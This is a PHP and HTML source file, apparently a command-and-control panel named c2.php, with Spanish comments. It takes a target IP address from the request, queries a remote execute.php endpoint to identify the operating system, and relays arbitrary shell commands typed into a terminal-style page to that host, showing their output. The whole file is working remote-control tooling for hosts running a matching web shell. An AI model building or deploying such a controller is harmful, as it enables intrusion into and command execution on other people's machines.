<?php
session_start();
// var_dump($_SESSION);
if(!isset($_SESSION['user'])){
    header('Location: /login.php');
    exit;
}

if($_GET['ip']){
    $ip = $_GET['ip'];
    $_SESSION['ip'] = $ip;

}else{
    $ip = $_SESSION['ip'];
}

if(!isset($_SESSION['os'])){
    $data = ['os' => true];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    $result = file_get_contents("http://$ip/execute.php", false, $context);
    $_SESSION['os'] = $result;
    var_dump($result);
    
}


if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($ip)) {
    $command = $_POST['command'];
    $target = "http://$ip/execute.php"; // URL del servidor HOLA

    // Enviar el comando al servidor HOLA
    $data = ['command' => $command];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($target, false, $context);

    echo $result !== FALSE ? $result : "Error al comunicarse con el servidor HOLA.";
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Controlador de Comandos</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #c5c6c7;
            font-family: Consolas, monospace;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .terminal {
            background-color: #272822;
            color: #66d9ef;
            width: 90%;
            max-width: 800px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            padding: 20px;
            overflow: hidden;
        }
        .terminal-body {
            height: 300px;
            overflow-y: auto;
            border: 1px solid #444;
            padding: 10px;
            margin-bottom: 10px;
            white-space: pre-wrap;
            font-size: 14px;
        }
        .terminal-input {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .terminal-input input {
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            border-radius: 5px;
            padding: 5px 10px;
            flex: 1;
        }
        .terminal-input button {
            background-color: #66d9ef;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            color: #1e1e1e;
            border-radius: 5px;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }
        .terminal-input button:hover {
            background-color: #55c0d6;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="terminal-body" id="output">
            <span>Esperando comando...</span>
        </div>
        <div class="terminal-input">
            <form id="command-form">
                <input type="text" id="command" placeholder="Escribe un comando" autofocus>
                <button type="submit" id="send-command">Enviar</button>
            </form>
        </div>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const output = document.getElementById("output");
            const commandInput = document.getElementById("command");
            const commandForm = document.getElementById("command-form");

            // Manejar el evento submit del formulario
            commandForm.addEventListener("submit", function (event) {
                event.preventDefault(); // Prevenir la recarga de la página

                const command = commandInput.value.trim();
                if (!command) return;

                fetch("c2.php", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: new URLSearchParams({ command })
                })
                    .then(response => response.text())
                    .then(data => {
                        output.innerHTML += `\n$ ${command}\n${data}`;
                        output.scrollTop = output.scrollHeight; // Desplazar al final
                        commandInput.value = "";
                    })
                    .catch(() => {
                        output.innerHTML += `\nError al enviar el comando.`;
                        output.scrollTop = output.scrollHeight;
                    });
            });
        });
    </script>
</body>
</html>
